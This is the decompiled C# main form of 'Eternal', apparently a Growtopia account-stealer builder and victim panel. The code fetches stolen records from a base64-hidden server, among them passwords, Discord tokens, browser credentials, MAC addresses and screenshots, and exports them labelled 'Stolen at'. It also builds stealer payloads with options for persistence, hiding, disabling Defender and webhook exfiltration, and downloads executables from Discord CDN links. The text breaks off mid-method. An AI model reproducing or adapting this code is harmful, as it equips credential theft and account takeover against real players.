using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DiscordRpcDemo;
using Eternal.Extensions;
using Eternal.Properties;
using MaterialSkin;
using MaterialSkin.Controls;
using Microsoft.Win32;
using Newtonsoft.Json;
using OpenQA.Selenium;

namespace Eternal
{
	// Token: 0x02000009 RID: 9
	public partial class MainForm : MaterialForm
	{
		// Token: 0x0600003E RID: 62 RVA: 0x000073A4 File Offset: 0x000055A4
		public MainForm()
		{
			IniParser parser = new IniParser("config.ini");
			string save = parser.GetSetting("MainForm", "Style");
			string darkmode = parser.GetSetting("MainForm", "DarkMode");
			MaterialSkinManager skinManager = MaterialSkinManager.Instance;
			try
			{
				bool flag = save == "3";
				if (flag)
				{
					base.SkinManager.AddFormToManage(this);
					base.SkinManager.ColorScheme = new ColorScheme(Primary.Green600, Primary.Green800, Primary.Green900, Accent.Green100, TextShade.WHITE);
				}
				bool flag2 = save == "0" || save == "1";
				if (flag2)
				{
					base.SkinManager.AddFormToManage(this);
					base.SkinManager.ColorScheme = new ColorScheme(Primary.Blue600, Primary.Blue800, Primary.Blue900, Accent.Blue100, TextShade.WHITE);
				}
				bool flag3 = save == "2";
				if (flag3)
				{
					base.SkinManager.AddFormToManage(this);
					base.SkinManager.ColorScheme = new ColorScheme(Primary.Cyan600, Primary.Cyan800, Primary.Cyan900, Accent.Cyan100, TextShade.WHITE);
				}
				bool flag4 = save == "4";
				if (flag4)
				{
					base.SkinManager.AddFormToManage(this);
					base.SkinManager.ColorScheme = new ColorScheme(Primary.LightBlue600, Primary.LightBlue800, Primary.LightBlue900, Accent.LightBlue100, TextShade.WHITE);
				}
				bool flag5 = darkmode == "1";
				if (flag5)
				{
					base.SkinManager.Theme = MaterialSkinManager.Themes.DARK;
				}
				else
				{
					base.SkinManager.Theme = MaterialSkinManager.Themes.LIGHT;
				}
			}
			catch
			{
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.Theme = MaterialSkinManager.Themes.DARK;
				base.SkinManager.ColorScheme = new ColorScheme(Primary.Blue600, Primary.Blue800, Primary.Blue900, Accent.Blue100, TextShade.WHITE);
				base.SkinManager.Theme = MaterialSkinManager.Themes.DARK;
			}
			this.InitializeComponent();
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000075E0 File Offset: 0x000057E0
		public void Renew(string user, string pass, string hwid, int acc, bool delete, string deleteid)
		{
			HardwareID.CheckAll();
			MainForm.index = 0;
			try
			{
				this.materialListView1.Items.Clear();
				string data = string.Empty;
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["username"] = user;
				nameValueCollection["password"] = ((hwid == "0") ? pass : pass.Hash());
				nameValueCollection["hwid"] = hwid;
				data = Program.client.UploadValues("http://" + Variables.basedata.Base64Decode() + "/server/display.php", nameValueCollection).Byte2String();
				data = data.TrimEnd(new char[]
				{
					'^'
				});
				string[] entities = data.Split(new char[]
				{
					'^'
				});
				foreach (string entity in entities)
				{
					string[] vars = entity.Split(new char[]
					{
						'|'
					});
					MainForm.Packet json = JsonConvert.DeserializeObject<MainForm.Packet>(vars[1]);
					string[] gercek = new string[12];
					gercek[0] = vars[0];
					gercek[1] = vars[3];
					gercek[2] = json.growid;
					gercek[3] = json.password;
					gercek[4] = json.lastworld;
					bool flag = vars[4] == "0";
					if (flag)
					{
						gercek[5] = "No";
					}
					else
					{
						gercek[5] = "Yes";
					}
					gercek[6] = json.mac;
					gercek[7] = json.desktoppic;
					gercek[8] = json.token;
					gercek[9] = vars[2];
					gercek[10] = json.browsercreds;
					gercek[11] = json.pcname;
					string id = vars[0];
					string packet = vars[1];
					string ip = vars[2];
					string date = vars[3];
					string hacked = vars[4];
					List<string[]> list = new List<string[]>();
					bool flag2 = !string.IsNullOrEmpty(entity);
					if (flag2)
					{
						list.Add(vars);
					}
					foreach (string[] items in list)
					{
						this.materialListView1.Items.Add(new ListViewItem(gercek));
						MainForm.index++;
					}
				}
				this.totalacc.Text = "Total Accounts: " + this.materialListView1.Items.Count.ToString();
				bool flag3 = !delete;
				if (flag3)
				{
					bool flag4 = MainForm.index == 0;
					if (flag4)
					{
					}
				}
			}
			catch (Exception a)
			{
				Application.DoEvents();
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000078B4 File Offset: 0x00005AB4
		[DebuggerStepThrough]
		public void SentPost(string poststr, int post, string tag, int setor)
		{
			//MainForm.<SentPost>d__11 <SentPost>d__ = new MainForm.<SentPost>d__11();
			//<SentPost>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<SentPost>d__.<>4__this = this;
			//<SentPost>d__.poststr = poststr;
			//<SentPost>d__.post = post;
			//<SentPost>d__.tag = tag;
			//<SentPost>d__.setor = setor;
			//<SentPost>d__.<>1__state = -1;
			//<SentPost>d__.<>t__builder.Start<MainForm.<SentPost>d__11>(ref <SentPost>d__);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x0000790C File Offset: 0x00005B0C
		[DebuggerStepThrough]
		public void Authtenticate(int webdriver, string email, string password)
		{
			//MainForm.<Authtenticate>d__12 <Authtenticate>d__ = new MainForm.<Authtenticate>d__12();
			//<Authtenticate>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<Authtenticate>d__.<>4__this = this;
			//<Authtenticate>d__.webdriver = webdriver;
			//<Authtenticate>d__.email = email;
			//<Authtenticate>d__.password = password;
			//<Authtenticate>d__.<>1__state = -1;
			//<Authtenticate>d__.<>t__builder.Start<MainForm.<Authtenticate>d__12>(ref <Authtenticate>d__);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x0000795A File Offset: 0x00005B5A
		public static void StopPost()
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00007960 File Offset: 0x00005B60
		private void DeleteAccount(string id, bool a)
		{
			if (a)
			{
				NameValueCollection post = new NameValueCollection();
				post["username"] = Variables.Username;
				post["password"] = Variables.Password.Hash();
				post["hwid"] = Variables.Hwid;
				string data = Program.client.UploadValues("http://" + Variables.basedata.Base64Decode() + "/server/delacc.php", post).Byte2String();
			}
			else
			{
				try
				{
					NameValueCollection post2 = new NameValueCollection();
					post2["username"] = Variables.Username;
					post2["password"] = Variables.Password.Hash();
					post2["hwid"] = Variables.Hwid;
					post2["deleteid"] = id;
					string data2 = Program.client.UploadValues("http://" + Variables.basedata.Base64Decode() + "/server/delete.php", post2).Byte2String();
				}
				catch
				{
					MessageBox.Show("Please select a valid account.", "Invalid Account");
				}
			}
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00007A84 File Offset: 0x00005C84
		private string BuildConfig()
		{
			HardwareID.CheckAll();
			byte[] bret = new WebClient().UploadData("http://" + Variables.basedata.Base64Decode() + "/882ac3b552305e0979e089d12d742331.php", "POST", Encoding.ASCII.GetBytes("auth=" + Variables.Username + "&amp;key=" + Variables.Hwid));
			string code = Encoding.ASCII.GetString(bret).Base64Decode();
			string cfg = string.Empty;
			cfg += (this.dctoken.Checked ? "1" : "0");
			cfg += (this.userinfo.Checked ? "1" : "0");
			cfg += (this.macaddr.Checked ? "1" : "0");
			cfg += (this.screenshot.Checked ? "1" : "0");
			cfg += (this.creds.Checked ? "1" : "0");
			cfg += (this.startup.Checked ? "1" : "0");
			cfg += "0";
			cfg += (this.hidestealer.Checked ? "1" : "0");
			cfg += (this.antitask.Checked ? "1" : "0");
			cfg += (this.trace.Checked ? "1" : "0");
			code = code.Replace("000000000", cfg);
			bool @checked = this.disabledef.Checked;
			if (@checked)
			{
				code = code.Replace("corruter = false;", "corruter = true;");
			}
			code = code.Replace("users = new string[] { }", "users = new string[] { \"" + Variables.Username + "\" }");
			bool checked2 = this.webhook.Checked;
			if (checked2)
			{
				code = code.Replace("dwebhook = false", "dwebhook = true");
				string addon = string.Empty;
				for (int i = 0; i < this.backupWebhooks.Items.Count; i++)
				{
					for (int j = 0; j < this.backupWebhooks.Items[i].SubItems.Count; j++)
					{
						string s = this.backupWebhooks.Items[i].SubItems[j].Text;
						addon = addon + "\"" + s.Base64Encode() + "\",";
					}
				}
				addon = addon.TrimEnd(new char[]
				{
					','
				});
				code = code.Replace("webhooks = new string[] { }", "webhooks = new string[] { " + addon + " }");
			}
			return code;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00007D78 File Offset: 0x00005F78
		public void SaveSettings()
		{
			IniParser parser = new IniParser("config.ini");
			parser.AddSetting("Poster", "email", this.emailbox.Text.Base64Encode());
			parser.AddSetting("Poster", "password", this.passbox.Text.Base64Encode());
			parser.AddSetting("Poster", "start", this.startbox.Text);
			parser.AddSetting("Poster", "stop", this.stopbox.Text);
			parser.AddSetting("Poster", "tag", this.taxbox.Text);
			parser.AddSetting("Poster", "text", this.PostText.Text.Base64Encode());
			parser.AddSetting("Poster", "delay", this.delay.Text);
			parser.SaveSettings();
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00007E6C File Offset: 0x0000606C
		public void LoadSettings()
		{
			IniParser parser = new IniParser("config.ini");
			try
			{
				this.emailbox.Text = parser.GetSetting("Poster", "email").Base64Decode();
			}
			catch
			{
			}
			try
			{
				this.passbox.Text = parser.GetSetting("Poster", "password").Base64Decode();
			}
			catch
			{
			}
			try
			{
				this.startbox.Text = parser.GetSetting("Poster", "start");
			}
			catch
			{
			}
			try
			{
				this.stopbox.Text = parser.GetSetting("Poster", "stop");
			}
			catch
			{
			}
			try
			{
				this.taxbox.Text = parser.GetSetting("Poster", "tag");
			}
			catch
			{
			}
			try
			{
				this.PostText.Text = parser.GetSetting("Poster", "text").Base64Decode();
			}
			catch
			{
			}
			try
			{
				this.delay.Text = parser.GetSetting("Poster", "delay");
			}
			catch
			{
			}
			try
			{
				CheckerData.serverip = parser.GetSetting("Checker", "ip");
			}
			catch
			{
			}
			try
			{
				CheckerData.serverport = parser.GetSetting("Checker", "port");
			}
			catch
			{
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00008050 File Offset: 0x00006250
		private void Form1_Load(object sender, EventArgs e)
		{
			base.BeginInvoke(new MethodInvoker(delegate()
			{
				DialogResult result = MessageBox.Show("There is a new update available! Do you want me to update?", "Eternal", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk);
				bool flag5 = result == DialogResult.Yes;
				if (flag5)
				{
				}
			}));
			ItemDatabase.SetupItemDefs();
			bool flag = Variables.AccountType > 0;
			if (flag)
			{
				this.materialLabel1.Text = "Welcome to Eternal - Premium Edition";
			}
			else
			{
				this.materialLabel1.Text = "Welcome to Eternal - Free Edition";
			}
			HardwareID.CheckAll();
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Eternal-Bin";
			bool flag2 = !Directory.Exists(directory);
			if (flag2)
			{
				Directory.CreateDirectory(directory);
			}
			bool flag3 = !File.Exists(directory + "\\proxynew.exe");
			if (flag3)
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/787285264174284801/827530964192067624/proxy_1.exe", directory + "\\proxynew.exe");
			}
			this.themebox.SelectedItem = "Default";
			this.materialComboBox2.SelectedItem = "Obfuscation";
			bool flag4 = !File.Exists("config.ini");
			if (flag4)
			{
				FileStream fs = File.Open("config.ini", FileMode.OpenOrCreate);
				fs.Close();
			}
			this.LoadSettings();
			this.handlers = default(DiscordRpc.EventHandlers);
			DiscordRpc.Initialize("810677169448681504", ref this.handlers, true, null);
			this.handlers = default(DiscordRpc.EventHandlers);
			DiscordRpc.Initialize("810677169448681504", ref this.handlers, true, null);
			this.presence.details = "discord.gg/eternals";
			this.presence.state = this.materialTabControl1.SelectedTab.Text + " Tab";
			this.presence.largeImageKey = "1234";
			this.presence.largeImageText = "Project Eternal";
			DiscordRpc.UpdatePresence(ref this.presence);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00008224 File Offset: 0x00006424
		private void materialButton1_Click(object sender, EventArgs e)
		{
			bool flag = this.themebox.SelectedIndex == 3;
			if (flag)
			{
				MaterialSkinManager skinManager = MaterialSkinManager.Instance;
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.ColorScheme = new ColorScheme(Primary.Green600, Primary.Green800, Primary.Green900, Accent.Green100, TextShade.WHITE);
			}
			bool flag2 = this.themebox.SelectedIndex == 0 || this.themebox.SelectedIndex == 1;
			if (flag2)
			{
				MaterialSkinManager skinManager2 = MaterialSkinManager.Instance;
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.ColorScheme = new ColorScheme(Primary.Blue600, Primary.Blue800, Primary.Blue900, Accent.Blue100, TextShade.WHITE);
			}
			bool flag3 = this.themebox.SelectedIndex == 2;
			if (flag3)
			{
				MaterialSkinManager skinManager3 = MaterialSkinManager.Instance;
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.ColorScheme = new ColorScheme(Primary.Cyan600, Primary.Cyan800, Primary.Cyan900, Accent.Cyan100, TextShade.WHITE);
			}
			bool flag4 = this.themebox.SelectedIndex == 4;
			if (flag4)
			{
				MaterialSkinManager skinManager4 = MaterialSkinManager.Instance;
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.ColorScheme = new ColorScheme(Primary.LightBlue600, Primary.LightBlue800, Primary.LightBlue900, Accent.LightBlue100, TextShade.WHITE);
			}
			this.materialButton2.PerformClick();
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00008398 File Offset: 0x00006598
		private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.materialSwitch1.Checked;
			if (@checked)
			{
				MaterialSkinManager skinManager = MaterialSkinManager.Instance;
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.Theme = MaterialSkinManager.Themes.DARK;
			}
			else
			{
				MaterialSkinManager skinManager2 = MaterialSkinManager.Instance;
				base.SkinManager.AddFormToManage(this);
				base.SkinManager.Theme = MaterialSkinManager.Themes.LIGHT;
			}
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000083FB File Offset: 0x000065FB
		private void materialCard1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000083FE File Offset: 0x000065FE
		private void accountToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00008401 File Offset: 0x00006601
		private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00008404 File Offset: 0x00006604
		private void materialTextBox2_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00008408 File Offset: 0x00006608
		private void materialButton5_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog saveFile = new OpenFileDialog())
			{
				bool flag = saveFile.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					this.materialListView3.Items.Add(saveFile.FileName + "|" + saveFile.SafeFileName);
				}
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00008474 File Offset: 0x00006674
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789", length)
			select s[MainForm.qwe.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000084C0 File Offset: 0x000066C0
		[DebuggerStepThrough]
		private void materialButton7_Click(object sender, EventArgs e)
		{
			//MainForm.<materialButton7_Click>d__28 <materialButton7_Click>d__ = new MainForm.<materialButton7_Click>d__28();
			//<materialButton7_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			//<materialButton7_Click>d__.<>4__this = this;
			//<materialButton7_Click>d__.sender = sender;
			//<materialButton7_Click>d__.e = e;
			//<materialButton7_Click>d__.<>1__state = -1;
			//<materialButton7_Click>d__.<>t__builder.Start<MainForm.<materialButton7_Click>d__28>(ref <materialButton7_Click>d__);
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00008507 File Offset: 0x00006707
		private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x0000850A File Offset: 0x0000670A
		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00008514 File Offset: 0x00006714
		private void materialButton2_Click(object sender, EventArgs e)
		{
			IniParser parser = new IniParser("config.ini");
			parser.AddSetting("MainForm", "Style", this.themebox.SelectedIndex.ToString());
			bool @checked = this.materialSwitch1.Checked;
			if (@checked)
			{
				parser.AddSetting("MainForm", "DarkMode", "1");
			}
			else
			{
				parser.AddSetting("MainForm", "DarkMode", "0");
			}
			parser.SaveSettings();
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00008599 File Offset: 0x00006799
		private void materialButton3_Click(object sender, EventArgs e)
		{
			this.Renew(Variables.Username, Variables.Password, Variables.Hwid, 0, false, "0");
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000085BC File Offset: 0x000067BC
		private void materialButton15_Click(object sender, EventArgs e)
		{
			bool flag = !string.IsNullOrEmpty(this.materialTextBox12.Text);
			if (flag)
			{
				this.backupWebhooks.Items.Add(this.materialTextBox12.Text);
				this.materialTextBox12.Text = "";
			}
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00008610 File Offset: 0x00006810
		private void removeToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00008613 File Offset: 0x00006813
		private void materialLabel34_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00008616 File Offset: 0x00006816
		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Renew(Variables.Username, Variables.Password, Variables.Hwid, 0, false, "0");
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00008636 File Offset: 0x00006836
		private void materialLabel33_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000863C File Offset: 0x0000683C
		private void materialListView1_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				string date = this.materialListView1.SelectedItems[0].SubItems[1].Text;
				string growid = this.materialListView1.SelectedItems[0].SubItems[2].Text;
				string password = this.materialListView1.SelectedItems[0].SubItems[3].Text;
				string lasworld = this.materialListView1.SelectedItems[0].SubItems[4].Text;
				string mac = this.materialListView1.SelectedItems[0].SubItems[6].Text;
				this.datetxt.Text = date;
				this.growidtxt.Text = growid;
				this.passtxt.Text = password;
				this.lastworldtxt.Text = lasworld;
				string[] split = mac.Split(new char[]
				{
					','
				});
				this.maclist.Items.Clear();
				foreach (string entity in split)
				{
					bool flag = !string.IsNullOrEmpty(entity);
					if (!flag)
					{
						break;
					}
					bool flag2 = entity.Length <= 18;
					if (flag2)
					{
						this.maclist.Items.Add(entity);
					}
				}
				Accdata.date = this.materialListView1.SelectedItems[0].SubItems[1].Text;
				Accdata.growid = this.materialListView1.SelectedItems[0].SubItems[2].Text;
				Accdata.password = this.materialListView1.SelectedItems[0].SubItems[3].Text;
				Accdata.lastworld = this.materialListView1.SelectedItems[0].SubItems[4].Text;
				Accdata.mac = this.materialListView1.SelectedItems[0].SubItems[6].Text;
				Accdata.picture = this.materialListView1.SelectedItems[0].SubItems[7].Text;
				Accdata.dctoken = this.materialListView1.SelectedItems[0].SubItems[8].Text;
				Accdata.ipaddress = this.materialListView1.SelectedItems[0].SubItems[9].Text;
				Accdata.browsercreds = this.materialListView1.SelectedItems[0].SubItems[10].Text;
				Accdata.pcname = this.materialListView1.SelectedItems[0].SubItems[11].Text;
			}
			catch
			{
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x0000895C File Offset: 0x00006B5C
		private void TabAccounts_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00008960 File Offset: 0x00006B60
		private void materialButton6_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog saveFile = new OpenFileDialog())
			{
				saveFile.Filter = "Icon (*.ico)|*.ico";
				bool flag = saveFile.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					this.icon.Text = saveFile.FileName;
				}
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000089C0 File Offset: 0x00006BC0
		private void deleteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			this.backupWebhooks.SelectedItems[0].Remove();
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000089DA File Offset: 0x00006BDA
		private void materialContextMenuStrip3_Opening(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000089DD File Offset: 0x00006BDD
		private void materialButton11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000089E0 File Offset: 0x00006BE0
		private void groupBox7_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000061 RID: 97 RVA: 0x000089E3 File Offset: 0x00006BE3
		private void MainForm_KeyUp(object sender, KeyEventArgs e)
		{
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000089E6 File Offset: 0x00006BE6
		private void MainForm_KeyPress(object sender, KeyPressEventArgs e)
		{
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000089E9 File Offset: 0x00006BE9
		private void MainForm_KeyDown(object sender, KeyEventArgs e)
		{
		}

		// Token: 0x06000064 RID: 100 RVA: 0x000089EC File Offset: 0x00006BEC
		private void showAccountInformationsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Informations fc = (Application.OpenForms["Informations"] != null) ? ((Informations)Application.OpenForms["Informations"]) : null;
			bool flag = fc != null;
			if (flag)
			{
				fc.Focus();
			}
			else
			{
				Informations frm = new Informations();
				frm.Show();
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00008A45 File Offset: 0x00006C45
		private void materialButton20_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00008A48 File Offset: 0x00006C48
		private void hidestealer_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00008A4B File Offset: 0x00006C4B
		private void trace_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00008A4E File Offset: 0x00006C4E
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00008A51 File Offset: 0x00006C51
		private void materialTabControl1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00008A54 File Offset: 0x00006C54
		private void MainForm_DoubleClick(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00008A57 File Offset: 0x00006C57
		private void materialTabControl1_TabIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00008A5C File Offset: 0x00006C5C
		private void materialTabControl1_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.handlers = default(DiscordRpc.EventHandlers);
			DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
			this.handlers = default(DiscordRpc.EventHandlers);
			DiscordRpc.Initialize("722171575646027816", ref this.handlers, true, null);
			this.presence.details = "discord.gg/eternals";
			this.presence.state = this.materialTabControl1.SelectedTab.Text + " Tab";
			this.presence.largeImageKey = "1234";
			this.presence.largeImageText = "Project Eternal";
			DiscordRpc.UpdatePresence(ref this.presence);
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00008B09 File Offset: 0x00006D09
		private void materialButton4_Click(object sender, EventArgs e)
		{
			this.materialListView3.Items.Clear();
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00008B1D File Offset: 0x00006D1D
		private void maclist_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00008B20 File Offset: 0x00006D20
		private void materialListView2_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00008B23 File Offset: 0x00006D23
		private void backupWebhooks_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00008B26 File Offset: 0x00006D26
		private void Utils_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00008B29 File Offset: 0x00006D29
		private void materialContextMenuStrip2_Opening(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00008B2C File Offset: 0x00006D2C
		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Clipboard.SetText(this.maclist.SelectedItems[0].Text);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00008B4B File Offset: 0x00006D4B
		private void timer1_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00008B50 File Offset: 0x00006D50
		private void savedatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string save = "";
			using (SaveFileDialog saveFile = new SaveFileDialog())
			{
				saveFile.Filter = "Text (*.txt)|*.txt";
				bool flag = saveFile.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					DateTime now = DateTime.Now;
					try
					{
						foreach (object obj in this.materialListView1.SelectedItems)
						{
							ListViewItem item = (ListViewItem)obj;
							bool flag2 = !save.Contains("Exported at: " + now.ToString() + "\n--------------------------------\n");
							if (flag2)
							{
								save = save + "Exported at: " + now.ToString() + "\n--------------------------------\n";
							}
							save = string.Concat(new string[]
							{
								save,
								"GrowID: ",
								item.SubItems[2].Text,
								"\nPassword: ",
								item.SubItems[3].Text,
								"\nStolen at: ",
								item.SubItems[1].Text,
								"\nMac Addresses: \n",
								item.SubItems[6].Text.Replace(",", "\n"),
								"\n\n"
							});
						}
					}
					catch (Exception a)
					{
						Application.DoEvents();
					}
					File.WriteAllText(saveFile.FileName, save);
					MessageBox.Show("Successfuly exported " + this.materialListView1.SelectedItems.Count.ToString() + " to " + saveFile.FileName, "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00008D6C File Offset: 0x00006F6C
		private void removeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000077 RID: 119 RVA: 0x00008D6F File Offset: 0x00006F6F
		private void tabPoster_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00008D74 File Offset: 0x00006F74
		private void materialButton16_Click(object sender, EventArgs e)
		{
			bool flag = Variables.AccountType > 0;
			if (flag)
			{
				bool flag2 = !string.IsNullOrEmpty(this.emailbox.Text) || !string.IsNullOrEmpty(this.passbox.Text);
				if (flag2)
				{
					string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Eternal-Bin";
					bool flag3 = !Directory.Exists(directory + "\\drivers");
					if (flag3)
					{
						Directory.CreateDirectory(directory + "\\drivers");
					}
					bool flag4 = !File.Exists(directory + "\\drivers\\chromedriver.exe");
					if (flag4)
					{
						new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/787276728636145700/819927737660604486/chromedriver.exe", directory + "\\drivers\\chromedriver.exe");
					}
					bool flag5 = this.authbutton.Text == "Authtenticate";
					if (flag5)
					{
						this.auth.Text = "Authtenticating..";
						this.Authtenticate(0, this.emailbox.Text, this.passbox.Text);
						this.auth.Text = "Authtenticated: True";
						this.SaveSettings();
						this.authbutton.Text = "ABORT";
						this.timer1.Interval = Convert.ToInt32(this.delay.Text) * 1000;
					}
					else
					{
						MainForm.driver.Quit();
						this.timer1.Enabled = false;
						this.authbutton.Text = "Authtenticate";
					}
				}
				else
				{
					MessageBox.Show("Please fill in the blanks", "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			else
			{
				MessageBox.Show("You Need Eternal Premium to Use This Feature. For Upgrades, You can Message to SrMotion#0001 via Discord.", "Project Eternal", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00008F28 File Offset: 0x00007128
		private void materialButton17_Click(object sender, EventArgs e)
		{
			bool flag = Variables.AccountType > 0;
			if (flag)
			{
				bool flag2 = MainForm.authtenticated;
				if (flag2)
				{
					bool flag3 = !string.IsNullOrEmpty(this.stopbox.Text) || !string.IsNullOrEmpty(this.startbox.Text) || !string.IsNullOrEmpty(this.taxbox.Text) || !string.IsNullOrEmpty(this.driversex.Text) || !string.IsNullOrEmpty(this.PostText.Text);
					if (flag3)
					{
						this.stopbutton.Enabled = true;
						this.startbutton.Enabled = false;
						this.timer1.Enabled = true;
						this.SaveSettings();
					}
					else
					{
						MessageBox.Show("Please fill in the blanks", "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
				else
				{
					MessageBox.Show("Please authtenticate first.", "Eternal", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			else
			{
				MessageBox.Show("You Need Eternal Premium to Use This Feature. For Upgrades, You can Message to SrMotion#0001 via Discord.", "Project Eternal", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0000902C File Offset: 0x0000722C
		private void pictureBox1_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000902F File Offset: 0x0000722F
		private void groupBox8_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00009034 File Offset: 0x00007234
		private void timer1_Tick_1(object sender, EventArgs e)
		{
			bool @checked = this.setor.Checked;
			if (@checked)
			{
